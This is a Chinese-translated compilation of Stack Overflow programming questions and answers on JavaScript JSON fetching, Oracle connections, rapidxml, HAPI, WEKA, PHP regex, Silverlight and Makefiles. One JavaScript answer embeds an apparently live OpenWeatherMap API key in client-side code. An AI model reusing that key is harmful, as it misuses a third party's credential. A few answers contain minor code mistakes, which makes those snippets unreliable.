> 时间：2012-09-17T14:18:28.363

如果您通过 Node.js 执行 CoffeeScript，您将可以完全访问您的操作系统的功能。使用模块的`spawn`方法[`child_process`](http://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options)创建一个新进程：

```
{spawn} = require 'child_process'
ls = spawn 'ls', ['array', 'of', 'options']
# receive all output and process
ls.stdout.on 'data', (data) -> console.log data.toString().trim()
# receive error messages and process
ls.stderr.on 'data', (data) -> console.log data.toString().trim() 
```

# javascript - 如何从 JavaScript 中的 URL 获取 JSON？

> ID：12460378
> 
> 赞同：219
> 
> 时间：2012-09-17T13:34:15.047
> 
> 标签：javascript, json

[此 URL](http://query.yahooapis.com/v1/public/yql?q=select%20%2a%20from%20yahoo.finance.quotes%20WHERE%20symbol%3D%27WRC%27&format=json&diagnostics=true&env=store://datatables.org/alltableswithkeys&callback)返回 JSON：

```
{
  query: {
    count: 1,
    created: "2015-12-09T17:12:09Z",
    lang: "en-US",
    diagnostics: {},
    ...
  }
} 
```

我试过这个，它没有用：

```
responseObj = readJsonFromUrl('http://query.yahooapis.com/v1/publ...');
var count = responseObj.query.count;

console.log(count) // should be 1 
```

如何从此 URL 的 JSON 响应中获取 JavaScript 对象？

* * *

## 回答 #1

> 赞同：210
> 
> 时间：2012-09-17T13:37:29.813

您可以使用 jQuery[`.getJSON()`](http://api.jquery.com/jQuery.getJSON/)函数：

```
$.getJSON('http://query.yahooapis.com/v1/public/yql?q=select%20%2a%20from%20yahoo.finance.quotes%20WHERE%20symbol%3D%27WRC%27&format=json&diagnostics=true&env=store://datatables.org/alltableswithkeys&callback', function(data) {
    // JSON result in `data` variable
}); 
```

如果您不想使用 jQuery，您应该查看纯 JS 解决方案的[答案](https://stackoverflow.com/a/2499647/1361042)。

* * *

## 回答 #2

> 赞同：175
> 
> 时间：2016-03-13T13:34:11.823

如果你想用纯 javascript 来做，你可以定义一个这样的函数：

```
var getJSON = function(url, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.responseType = 'json';
    xhr.onload = function() {
      var status = xhr.status;
      if (status === 200) {
        callback(null, xhr.response);
      } else {
        callback(status, xhr.response);
      }
    };
    xhr.send();
}; 
```

并像这样使用它：

```
getJSON('http://query.yahooapis.com/v1/public/yql?q=select%20%2a%20from%20yahoo.finance.quotes%20WHERE%20symbol%3D%27WRC%27&format=json&diagnostics=true&env=store://datatables.org/alltableswithkeys&callback',
function(err, data) {
  if (err !== null) {
    alert('Something went wrong: ' + err);
  } else {
    alert('Your query count: ' + data.query.count);
  }
}); 
```

请注意，这`data`是一个对象，因此您无需解析即可访问其属性。

* * *

## 回答 #3

> 赞同：116
> 
> 时间：2017-04-03T02:43:03.313

使用 Chrome、Firefox、Safari、Edge 和 Webview，您可以在本地使用 fetch API，这使得这变得更容易、更简洁。

*如果您需要支持 IE 或更旧的浏览器，您也可以使用[fetch polyfill](https://github.com/github/fetch)。*

```
let url = 'https://example.com';

fetch(url)
.then(res => res.json())
.then(out =>
  console.log('Checkout this JSON! ', out))
.catch(err => throw err); 
```

[MDN：获取 API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)

即使 Node.js 没有内置此方法，您也可以使用[node-fetch](https://www.npmjs.com/package/node-fetch)来实现完全相同的实现。

* * *

## 回答 #4

> 赞同：27
> 
> 时间：2019-04-21T16:27:15.500

ES8(2017) 尝试

```
obj = await (await fetch(url)).json(); 
```

```
async function load() {
    let url = 'https://my-json-server.typicode.com/typicode/demo/db';
    let obj = await (await fetch(url)).json();
    console.log(obj);
}

load();
```

你可以通过 try-catch 处理错误

```
async function load() {
    let url = 'http://query.yahooapis.com/v1/publ...';
    let obj = null;

    try {
        obj = await (await fetch(url)).json();
    } catch(e) {
        console.log('error');
    }

    console.log(obj);
}

load();
```

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2018-04-06T23:08:58.487

[Axios](https://github.com/axios/axios)是一个基于 Promise 的 HTTP 客户端，用于浏览器*和 node.js。*

它为 JSON 数据提供自动转换，这[是 Vue.js 团队](https://medium.com/the-vue-point/retiring-vue-resource-871a82880af4)在从默认包含 REST 客户端的 1.0 版本迁移时的官方推荐。

> 执行`GET`请求
> 
> ```
> // Make a request for a user with a given ID
> axios.get('http://query.yahooapis.com/v1/publ...')
>   .then(function (response) {
>     console.log(response);
>   })
>   .catch(function (error) {
>     console.log(error);
>   }); 
> ```

或者甚至就`axios(url)`足够了，因为`GET`请求是默认设置。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2018-03-19T19:48:14.133

定义一个函数，如：

```
fetchRestaurants(callback) {
    fetch(`http://www.restaurants.com`)
       .then(response => response.json())
       .then(json => callback(null, json.restaurants))
       .catch(error => callback(error, null))
} 
```

然后像这样使用它：

```
fetchRestaurants((error, restaurants) => {
    if (error) 
        console.log(error)
    else 
        console.log(restaurants[0])

}); 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-08-23T06:11:23.540

```
async function fetchDataAsync(url) {
    const response = await fetch(url);
    console.log(await response.json());
}

fetchDataAsync('paste URL');
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2020-06-12T09:48:19.883

今天早上，我也有同样的疑问，现在它被清除了，我刚刚使用 JSON 和 'open-weather-map'( [https://openweathermap.org/](https://openweathermap.org/) ) api 并从 index.html 文件中的 URL 获取数据，代码如下所示：-

```
 //got location
 var x = document.getElementById("demo");
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(weatherdata);
      } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";
      }
    //fetch openweather map url with api key
    function weatherdata(position) {
//put corrdinates to get weather data of that location
      fetch('https://api.openweathermap.org/data/2.5/weather?lat='+position.coords.latitude+'&lon='+position.coords.longitude+'&appid=b2c336bb5abf01acc0bbb8947211fbc6')
      .then(response => response.json())
      .then(data => {
      console.log(data);
      document.getElementById("demo").innerHTML = 
      '<br>wind speed:-'+data.wind.speed + 
      '<br>humidity :-'+data.main.humidity + 
      '<br>temprature :-'+data.main.temp  
      });
    }
```

```
 <div id="demo"></div>
```

我公开了 api 密钥，因为我有免费订阅，刚开始时有免费订阅。你可以在“rapidapi.com”找到一些不错的免费 API 和密钥

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-04-27T14:29:49.893

作为此页面中的@DanAlboteanu 答案以及该javascript的一些错误校正，我建议的代码是：

```
fetchRestaurants((error, data) => {
    if (error)
        console.log(error); 
    else
        console.log(data)

}); 
```

并且 fetchRestaurants 方法是（请将您的 json url 替换为 {your url of json data}）：

```
function fetchRestaurants(callback) {
    fetch("{your url of json data}")
       .then(response => response.json())
       .then(json => callback(null, json))
       .catch(error => callback(error, null))
} 
```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2019-08-23T11:06:49.830

```
//Resolved
const fetchPromise1 = fetch(url);
    fetchPromise1.then(response => {
      console.log(response);
    });

//Pending
const fetchPromise = fetch(url);
console.log(fetchPromise); 
```

* * *

## 回答 #11

> 赞同：-2
> 
> 时间：2019-05-21T14:53:53.390

您可以在 JavaScript 中使用 fetch() 访问 JSON 数据

使用您的 url 更新 fetch() 的 url 参数。

```
fetch(url)
    .then(function(response){
        return response.json();
    })
    .then(function(data){
        console.log(data);
    }) 
```

希望它有帮助，它对我来说非常有效。

# c# - OracleConnection 抛出空异常

> ID：12460384
> 
> 赞同：2
> 
> 时间：2012-09-17T13:34:31.610
> 
> 标签：c#, oracle, database-connection, odp.net, odac

我正在尝试从我的新 PC 连接到我的 Oracle 数据库。我刚刚安装了 Visual Studio 和 ODAC。但是当我尝试做一个简单的连接时，我得到一个空消息、空源、空数字的异常，只是错误代码是*-2147467259*。

```
OracleConnection Prueba;
Prueba = new OracleConnection("Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST=XXX.XXX.XXX.XXX)(PORT=1521)))(CONNECT_DATA=(SERVER=DEDICATED)(SERVICE_NAME=XXXX)));User Id=XXX;Password=XXX;Pooling=true;Max Pool Size=10;Min Pool Size=1");
Prueba.Open(); 
```

**异常详细信息**
这是 Exception.ToString() 代码：

> “Oracle.DataAccess.Client.OracleException.HandleErrorHelper 处的 Oracle.DataAccess.Client.OracleException（Int32 errCode，OracleConnection conn，IntPtr opsErrCtx，OpoSqlValCtx* pOpoSqlValCtx，Object src，字符串过程）
> 在 Oracle.DataAccess.Client.OracleException.HandleError（Int32 errCode, OracleConnection conn, IntPtr opsErrCtx, Object src)
> at Oracle.DataAccess.Client.OracleConnection.Open()
> at OracleConnectionS.Program.Main(String[] args) 在 C:\Users\Simetri\Documents\Visual Studio 2010\Projects \OracleConnection\OracleConnection\Program.cs：第 19 行"

关于为什么会发生这种情况的任何想法？

**更新**

如果我以管理员身份运行 Visual Studio，则不会出现异常，并且可以很好地连接到数据库。

我尝试向 Oracle Directory 授予 FULL CONTROL 权限`C:\Oracle`。但是，如果我以正常方式（而不是以管理员身份）运行 Visual Studio，我会不断收到异常。

**背景信息**
- 我使用的是 Windows 7 64 位
- Visual Studio 2010
- 我可以使用 SQL*PLUS 进行连接

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-12-19T14:59:24.850

因此，在安装了各种版本的 ODAC 并搜索了与此相关的每个帖子之后。

最后，32 位版本的全新安装是解决方案。

*   首先，您需要卸载您曾经安装的所有其他 oracle 客户端。
*   之后，查找您想要的任何 ODAC 版本（如果可能，请提供最新版本），但请务必下载 32 位版本。

为什么？

嗯，这与开发 Visual Studio 的版本有关。如果您正在开发控制台应用程序，则客户端版本不会有问题，但如果您使用的是 Web 项目，那么您肯定需要 32 位版本。

*   最后确保目标平台Visual Studio中的所有项目都是“32位”
*   并引用您刚刚安装的新 Oracle.DataAccess.dll

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:07:53.697

请尝试将您的连接字符串重新格式化为这种形式，看看它是如何工作的

```
<add name="LoisDataAccess" connectionString="Data Source=LOISPRD;Persist Security Info=True;User ID=ABC;Password=DEF" providerName="System.Data.OracleClient" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:09:39.440

如果您使用的客户端是“Instant Client”，那么最好将一些 Oracle-DLL 复制到您的解决方案中——请参阅[此](http://jeremybranham.wordpress.com/2011/04/25/oracle-instant-client-with-odp-net/)。

如果可能的话，我会建议使用不同的 .NET 提供程序...根据我的经验，大多数商业提供的问题比 Oracle .NET 提供程序的问题要少得多 - 请参阅[此处的 SO](https://stackoverflow.com/a/9674226/847363)。

# c++ - rapidXML 解析错误行为

> ID：12460385
> 
> 赞同：0
> 
> 时间：2012-09-17T13:34:32.267
> 
> 标签：c++, rapidxml

我正在尝试解析一个 xml 文件：

```
<?xml version="1.0"?>
<settings>
    <output>test.dat</output>
    <width>5</width>
    <depth>4</depth>
    <height>10</height>
</settings> 
```

主要的：

```
int _tmain(int argc, wchar_t* argv[])
{
    std::string SettingsFile = "settings.xml";
    rapidxml::xml_document<> doc;
    char* settings = FileHandler::readFileInChar(SettingsFile.c_str());

    std::cout << strlen(settings); // Output 1
    doc.parse<0 | rapidxml::parse_no_data_nodes>(settings);
    std::cout << strlen(settings); // Output 2

    ....
} 
```

输出1：129

输出2：31

辅助功能：

```
static char* readFileInChar(const char* p_pccFile) 
{
    char* cpBuffer;
    size_t sSize;

    std::ifstream ifFileToRead;
    ifFileToRead.open(p_pccFile, std::ios::binary);

    if(ifFileToRead.is_open()) {
        sSize = getFileLength(&ifFileToRead);

        cpBuffer = new char[sSize+1];
        ifFileToRead.read(cpBuffer, sSize);
        ifFileToRead.close();
    }

    cpBuffer[sSize] = '\0';

    return cpBuffer;
}

static size_t getFileLength(std::ifstream* file) 
{
    file->seekg(0, std::ios::end);
    size_t length = file->tellg();
    file->seekg(0, std::ios::beg);

    return length;
} 
```

当我尝试访问任何节点时，这会导致异常。我想我在这里遗漏了一些明显的东西，但到目前为止我还不明白。

如果我尝试类似：

```
std::cout << doc.first_node("output")->value(); 
```

我收到消息说在读取位置 0x00000004 时出现访问冲突。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:24:44.170

该文档没有名称为“输出”的节点。该文档有一个名为“settings”的节点，而该节点又具有一个名为“output”的节点。以下代码

```
 std::ifstream file("settings.xml");
  std::vector<char> content = std::vector<char>(std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>());
  content.push_back('\0');

  rapidxml::xml_document<> doc;
  doc.parse<0 | rapidxml::parse_no_data_nodes>(&content[0]);

  rapidxml::xml_node<> * root = doc.first_node();
  for (rapidxml::xml_node<> * node = root->first_node(); node; node = node->next_sibling())
  {
    std::cout << "value of <" << node->name() << "> is " << node->value() << std::endl;
  } 
```

印刷

```
value of <output> is test.dat
value of <width> is 5
value of <depth> is 4
value of <height> is 10 
```

在我的机器上。

编辑：如果您在调试器中查看“内容”，您可以清楚地看到 rapidxml 将 '\0' 插入其中的位置。

# java - 如何修复 HAPI 早期连接关闭警告？

> ID：12460390
> 
> 赞同：1
> 
> 时间：2012-09-17T13:34:47.480
> 
> 标签：java, hl7, hapi

我正在使用[HAPI](http://hl7api.sourceforge.net/)为 HL7v2 消息传递编写一个简单的客户端和服务器。客户端和服务器似乎都可以工作，但`INFO`在发送确认消息时会发出有关早期套接字终止的级别警告。

服务器产生以下内容：

```
2012-09-17 13:36:38,715 INFO  pool-1-thread-1 [MinLLPReader] End of input stream reached.
2012-09-17 13:36:38,718 INFO  pool-1-thread-1 [Receiver] Closing connection (no more messages available). 
```

以及客户端上的补充错误：

```
2012-09-17 13:36:38,715 INFO  pool-1-thread-1 [MinLLPReader] SocketException on read() attempt.  Socket appears to have been closed: socket closed 
2012-09-17 13:36:38,716 INFO  pool-1-thread-1 [Receiver] Closing connection (no more messages available). 
```

**如何阻止这些消息出现？**

发送确认的服务器代码如下所示。请注意，由于对 HL7v2 规范的“有趣”解释，我不得不禁用所有可能的消息验证组件：

```
// HAPI server component
final LowerLayerProtocol llp = LowerLayerProtocol.makeLLP();
final PipeParser parser = new PipeParser();
final SimpleServer server = new SimpleServer(12345, llp, parser, false);

// registers an admission message handler
server.registerApplication("ADT", "A01", new Application() {

    @Override
    public Message processMessage(final Message message) throws ApplicationException, HL7Exception {

        final PipeParser pipeParser = new PipeParser();
        pipeParser.setValidationContext(new NoValidation());
        final String encoded = pipeParser.encode(message);

        final AbstractMessage adtMessage = new ADT_A01();
        adtMessage.setValidationContext(new NoValidation());
        adtMessage.parse(encoded);

        return (ACK) DefaultApplication.makeACK(adtMessage);    
    }

    @Override
    public boolean canProcess(final Message message) {
        return true;
    }
});

// tell HAPI not to try to validate incoming messages
server.registerConnectionListener(new ConnectionListener() {    

    @Override
    public void connectionReceived(final Connection c) {
        c.getParser().setValidationContext(new NoValidation());
    }

    @Override
    public void connectionDiscarded(Connection c) {
        // nothing
    }
}); 

server.start(); 
```

和客户：

```
ConnectionHub hub = null;
Connection conn = null;

try {

    final ADT_A01 adtMessage = new ADT_A01();
    adtMessage.parse(message); // message content as a string

    hub = ConnectionHub.getInstance();
    final PipeParser connParser = new PipeParser();
    connParser.setValidationContext(new NoValidation());

    conn = hub.attach(host, port, connParser, MinLowerLayerProtocol.class);
    final Initiator init = conn.getInitiator();

    final Message response = init.sendAndReceive(adtMessage);
    final String responseString = connParser.encode(response);
    System.out.println("Received response:\n" + responseString);

}
finally {

    if (conn != null) {
        hub.discard(conn);
    }

    ConnectionHub.shutdown();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T18:57:07.427

不确定您使用哪个记录器实现...对于您提到的两个类（ca.uhn.hl7v2.app.Receiver、ca.uhn.hl7v2.llp.MinLLPReader），只需将日志级别设置为 WARN，消息就会消失。

基督教

# java - WEKA - JDBC 连接异常

> ID：12460391
> 
> 赞同：2
> 
> 时间：2012-09-17T13:34:49.630
> 
> 标签：java, jdbc, data-mining, weka

我在尝试使用 WEKA 连接 MySQL DB 时遇到 JDBC 连接问题。

这是我的**DatabaseUtils.properties**文件：

```
jdbcDriver=com.mysql.jdbc.Driver
jdbcURL=jdbc:mysql://localhost:3306/mydb 
```

**我将 jdbc-mysql jar 添加到路径中：**

```
/opt/SenchaSDKTools-2.0.0-beta3:/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/home/talha/apache-maven-3.0.4/bin:/home/talha/mysql-connector-java-5.1.20.jar:/opt/SenchaSDKTools-2.0.0-beta3:/home/talha/apache-maven-3.0.4/bin:/usr/lib/jvm/jdk1.7.0_05/bin:/home/talha/apache-maven-3.0.4/bin 
```

**Java类【一个简单的测试类】**

```
public class Test {

    public static void main(String[] args) throws Exception {

        InstanceQuery query = new InstanceQuery();
        query.setUsername("username");
        query.setPassword("password");
        String sql = "select * from user";
        query.setQuery(sql);
        // if your data is sparse, then you can say so too
        // query.setSparseData(true);
        Instances data = query.retrieveInstances();

    }

} 
```

**完整的堆栈跟踪：**

```
Trying to add database driver (JDBC): RmiJdbc.RJDriver - Error, not in CLASSPATH?
Trying to add database driver (JDBC): jdbc.idbDriver - Error, not in CLASSPATH?
Trying to add database driver (JDBC): com.mckoi.JDBCDriver - Error, not in CLASSPATH?
Trying to add database driver (JDBC): org.hsqldb.jdbcDriver - Error, not in CLASSPATH?
Disconnected from the target VM, address: '127.0.0.1:33305', transport: 'socket'
Exception in thread "main" java.sql.SQLException: No suitable driver found for jdbc:idb=experiments.prp
    at java.sql.DriverManager.getConnection(DriverManager.java:604)
    at java.sql.DriverManager.getConnection(DriverManager.java:221)
    at weka.experiment.DatabaseUtils.connectToDatabase(DatabaseUtils.java:521)
    at weka.experiment.InstanceQuery.retrieveInstances(InstanceQuery.java:286)
    at weka.experiment.InstanceQuery.retrieveInstances(InstanceQuery.java:271)
    at com.tk.miner.Test.main(Test.java:22) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-18T06:38:49.303

根据 JavaDocs [InstanceQuery](http://weka.sourceforge.net/doc/weka/experiment/InstanceQuery.html)默认为“jdbc.idbDriver”和“jdbc:idb=experiments.prp”。

`DatabaseUtils.properties`您可以使用文件覆盖它们。尝试放入`DatabaseUtils.props`user.home **(** /home/talha/ ?) 或**当前目录**（在 Eclipse 中，当前目录是包含文件夹的项目文件`src`夹 - 不知道它在 IntelliJ Idea 上的位置）。

# php - 让我了解 preg_replace

> ID：12460400
> 
> 赞同：3
> 
> 时间：2012-09-17T13:35:38.693
> 
> 标签：php, regex, preg-replace

我一直在互联网上寻找一些有用的信息，我想我发现的太多了。我试图理解正则表达式，但不明白。

比如说`$data="A bunch of text [link=123] another bunch of text."`，它应该被替换为`"< a href=\"123.html\">123< /a>"`.

我一直在尝试很多类似这样的代码：

`$find = "/[link=[([0-9])]/";
$replace = "< a href=\"$1\">$1< /a>";
echo preg_replace ($find, $replace, $data);`

但输出始终与原始 $data 相同。

我想我必须看到一些与我的问题相关的东西才能理解基础知识。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:37:50.563

`[]`删除周围的多余部分`()`，并在`+`之后添加`[0-9]`以量化它。此外，逃避`[]`构成标签本身的。

```
$find = "/\[link=(\d+)\]/"; // "\d" is equivalent to "[0-9]"
$replace = "<a href=\"$1.html\">$1</a>";
echo preg_replace($find,$replace,$data); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:48:59.090

正则表达式将是**\[link=([\d]+)\]**

您可以在此处找到快速了解正则表达式的良好来源[http://www.regular-expressions.info/](http://www.regular-expressions.info/)

当你真正对正则表达式的力量感兴趣时，你应该买这本书：[掌握正则表达式](http://shop.oreilly.com/product/9780596002893.do)

一个在 Windows 客户端上测试 RexEx 的好程序是：[RegEx-Trainer](http://www.sql-und-xml.de/freeware-tools/regex-trainer.zip)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:52:43.223

```
<?php
$data= "A bunch of text [link=123] another bunch of text.";
$find = '/\[link=([0-9]+?)\]/';
echo preg_replace($find, "<a href=\"$1\">$1</a>", $data); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:38:00.680

您缺少`+`量词，因此如果后面有一个数字，您的模式匹配`link=`。

并且有一个额外的对，`[..]`因此外部`[...]`将被视为字符类。

你也忘记了逃跑的收场`]`。

解决方案：

```
$find = "/[link=([0-9]+)\]/"; 
```

# css - 在渲染页面之前respond.js IE运行脚本

> ID：12460401
> 
> 赞同：1
> 
> 时间：2012-09-17T13:35:41.663
> 
> 标签：css, rendering, media-queries

我正在使用 respond.js 向我的 Web 应用程序添加媒体查询功能。它在 IE8 中工作，但在 response.js 运行并更正页面外观时，页面在最初的一秒呈现不同。

脚本和 css 在页面中运行。

```
<head>
...
    <link href="master.css" type="text/css" />
    <script src="respond.min.js" />
...
</head> 
```

有没有办法让 response.js 在页面呈现之前运行？

# c# - 在 View 上分配事件时无法引用基类方法

> ID：12460404
> 
> 赞同：0
> 
> 时间：2012-09-17T13:36:21.653
> 
> 标签：c#, silverlight, xaml

几天前，我意识到在 Silverlight 中，为了始终更新任何 texbox 上的绑定（以验证每个 KeyPress 中的错误），我需要在系统中的**每个**TextBox 中的 TextChanged Event 事件上使用以下代码：

```
TextBox txCtl = (TextBox)sender; if (txCtl != null)
{
    var be = txCtl.GetBindingExpression(TextBox.TextProperty);

    if (be != null)
    {
        be.UpdateSource();
    }
} 
```

此代码运行良好（来源：[http](http://forums.silverlight.net/t/51100.aspx/1) ://forums.silverlight.net/t/51100.aspx/1 ）。问题是：我不想在我拥有的每个视图 CodeBehind 中都重复它，所以我决定制作一个自定义 ViewBase，我将把这段代码留在上面。我所做的只是：

```
public class ViewBase : ChildWindow
{
    protected void tboxTextChanged(object sender, TextChangedEventArgs e)
    {
        TextBox txCtl = (TextBox)sender; if (txCtl != null)
        {
            var be = txCtl.GetBindingExpression(TextBox.TextProperty);

            if (be != null)
            {
                be.UpdateSource();
            }
        }
    }
} 
```

然后我的视图现在是 ViewBase，而不是 UserControl，所以我还将 XAML 更改为：

```
<src:ViewBase x:Class="Oi.SCPOBU.Silverlight.Pages.CadastroClassificacao"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"    
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:src="clr-namespace:Oi.SCPOBU.Silverlight.Pages" [...] 
```

最后，在我的文本框中，我让事件引用了与往常一样的方法，但现在该方法在 ViewBase 中，而不是在 CodeBehind 中：

```
<TextBox
   x:Name="tbxNome"
   Width="300"
   MaxLength="50"
   HorizontalAlignment="Left"
   TextChanged="tboxTextChanged"
   Text="{Binding DTOClassificacao.Nome, Mode=TwoWay, NotifyOnValidationError=True> 
```

对我来说似乎很简单，但这不起作用。代码编译，但在运行时我收到错误：“消息 = 无法分配给属性 'System.Windows.Controls.TextBox.TextChanged'。[Line: 43 Position: 37]”，在 InitializeComponent() 方法上。

有人知道如何将基类中的方法分配给事件吗？或者我真的必须在我拥有的每个视图中重复此代码吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:51:09.950

> 为了始终更新任何 texbox 上的绑定（为了验证每个 KeyPress 中的错误），我需要在系统中的每个 TextBox 中的 TextChanged Event 事件上使用此代码

你试过`UpdateSourceTrigger.PropertyChanged`吗？

```
<TextBox Text="{Binding Text, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}"/> 
```

# iphone - 如何知道 GLCameraRipple 示例中的涟漪何时消失？

> ID：12460405
> 
> 赞同：1
> 
> 时间：2012-09-17T13:36:24.267
> 
> 标签：iphone, objective-c, ios, opengl-es

我正在使用[GLCameraRipple 示例](http://developer.apple.com/library/ios/#samplecode/GLCameraRipple/Introduction/Intro.html) 在静态图像上产生涟漪，我使用 glTexImage2D 加载该静态图像。

我使用自己的着色器，因为示例中的着色器用于从视频源中获取图像。

它响应触摸并在触摸位置上产生涟漪。

它工作正常，但是当波纹动画完成时，出于电池保护的原因，我需要它来暂停绘图。在 Apple 的这个示例中，我看不到如何检查此状态。GLKView 或 GLKViewController 没有任何委托方法。

它使用了一个 -runSimulation 方法，该方法在我的 GLKViewController 的每个 -update 中调用，它可以完成所有的魔法，但我仍然看不到在哪里可以检查涟漪是否已完成动画，甚至无法将初始状态与状态进行比较到处都是涟漪。

我目前正在计算自己最多需要多少时间来完成波纹动画，直到我们再次看到静态图像并且我已将其设置为在此秒数后暂停并在发生触摸事件时再次取消暂停，但是感觉完全不对。（动画持续时间在较大的屏幕上（例如在 iPad 上）会有所不同，并且可能会根据池大小、网格因子、触摸半径等而有所不同。）

我希望有一种方法可以检查视图的内容是否不同于初始状态（当我刚刚加载图像时）并知道波纹动画是否播放完毕？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T16:55:48.030

根据要求，我将我的评论转换为答案，以便可以关闭问题。

GLCameraRipple 示例使用名为 的内部数组计算图像中纹理坐标的位移`rippleTexCoords`。该数组`-runSimulation`在每一帧的方法中更新，这就是导致涟漪传播的原因。

如果您观察该数组的值的变化，您可以确定波纹在某个阈值以下消退的点。然后，您可以将其用作暂停正在进行的模拟的时间。

# javascript - Java 脚本事件处理

> ID：12460406
> 
> 赞同：0
> 
> 时间：2012-09-17T13:36:30.170
> 
> 标签：javascript, html, dom, javascript-events

以下片段：

如果在文本框中按下以下任何键，则 exec() 方法不应继续：

```
shift,
ctrl,
alt,
caps,
tab,
esc,
home,
etc 
```

有没有没有jQuery的跨浏览器方式来做到这一点？谢谢。

# facebook - 用户对用户请求

> ID：12460409
> 
> 赞同：0
> 
> 时间：2012-09-17T13:36:33.223
> 
> 标签：facebook, facebook-graph-api, koala

我正在构建一个事件应用程序，用户在其中创建一个事件并邀请他/她的朋友。我自定义构建了朋友选择器，因为选择朋友是整个过程中的步骤之一（Facebook 朋友选择器在单击邀请按钮后立即发送邀请）。选择朋友后，我将该信息与其他信息一起呈现以获取用户的确认。我必须通知受邀者这个新活动。这是我的选择

通知（仅限应用用户）

消息（仅限应用用户）

请求（应用程序到用户仅限于应用程序用户，但用户到用户不是）

所以我唯一的选择是使用用户对用户的请求，目前只有 dialogAPI 才有可能。我不能使用 dialogAPI，因为我有一个自定义朋友选择器。

是否可以向尚未授权应用程序的用户发送用户通知/消息/请求？还有其他想法吗？

# forms - 标签应用于两个表单元素时的最佳可用性？

> ID：12460412
> 
> 赞同：1
> 
> 时间：2012-09-17T13:36:49.583
> 
> 标签：forms, accessibility

我有一个“时间选择”表单，它是两个选择选项元素，一个用于小时，一个用于分钟（粒度为 15 分钟）。

我只想要一个标签说“选择时间”，因为我认为它的小时和分钟很明显。通常我将标签与输入相关联，如下所示：

```
<label for="something">Label Text</label>
<input id="something" /> 
```

那么在这种标签与两个元素相关的情况下我应该怎么做呢？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T23:43:20.213

我会标记两个输入（小时，分钟，像您一样明确关联），使用其中一种 CSS 技术在视觉上隐藏它们（但将它们保留在 DOM 中，以便 AT 可以使用）。然后将所有内容包装在 a 中[`fieldset`](http://www.w3.org/wiki/HTML/Elements/fieldset)，并将 a 添加`legend`到`fieldset`“选择时间”中。

**像这样：**

```
<fieldset>
    <legend>Choose Time</legend>
    <label for="hour">Hour</label>
    <input id="hour" />
    <label for="minute">Minute</label>
    <input id="minute" />
</fieldset> 
```

# makefile - 如何评估在规则内创建的变量？（带评估）

> ID：12460413
> 
> 赞同：1
> 
> 时间：2012-09-17T13:36:49.210
> 
> 标签：makefile

我是 makefile 的新手，我陷入了这个问题：如何创建指向找到的目录中所有文件的符号链接，所有这些都在规则中：

我想知道对“查找”的调用是否检索到任何结果。如果我将结果分配给带有“eval”的变量（我知道在规则中设置变量的唯一方法是什么），“ifdef”评估不起作用。

我也尝试过将“”与“ifneq”进行比较，但不起作用。

可能我走错了方向，所以如果有人有替代方法，我将非常感激。

这里是整个 Makefile：（用###### 标记的有趣行）

十分感谢！

```
DEFAULT_YCS_ROOT := /opt/yujin

all:
ifdef YCS_ROOT
    @echo Looking for Yujin maps in ${YCS_ROOT}
else
    $(eval YCS_ROOT := ${DEFAULT_YCS_ROOT})
    @echo WARNING: YCS_ROOT is undefined. Looking for Yujin maps in default path ${YCS_ROOT}
endif

    $(eval MAPS_DIR := $(shell find ${YCS_ROOT} -name yujin_maps))
    @echo ${MAPS_DIR}  "${MAPS_DIR}"
ifdef MAPS_DIR  ######
###### misguided alternative....  ifneq (${MAPS_DIR}, " ")
    $(eval DEST_DIR := $(shell pwd)/resources/yaml/stage/maps)
    @echo Creating symbolic links on ${DEST_DIR} for every PGM map on ${MAPS_DIR}/maps
    rm ${DEST_DIR}/*.pgm
    for f in ${MAPS_DIR}/maps/*.pgm; do ln -s $$f ${DEST_DIR}/; done
else
    @echo ERROR: Yujin maps package not found in ${YCS_ROOT}. Define YCS_ROOT variable properly
endif 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T19:21:27.510

首先，假设您使用的是 GNUMake，有一种更简单的方法来处理`YCS_ROOT`and `DEFAULT_YCS_ROOT`：

```
DEFAULT_YCS_ROOT := /opt/yujin
YCS_ROOT ?= DEFAULT_YCS_ROOT 
```

当且仅当未定义时，这将分配给的值`DEFAULT_YCS_ROOT`。`YCS_ROOT``YCS_ROOT`

对于变量`MAPS_DIR`and `DEST_DIR`，您将 Make 语法与 shell 语法混合使用。我认为最简单的方法是在规则之外定义两个变量：

```
MAPS_DIR := $(shell find ${YCS_ROOT} -name yujin_maps)
DEST_DIR := $(shell pwd)/resources/yaml/stage/maps 
```

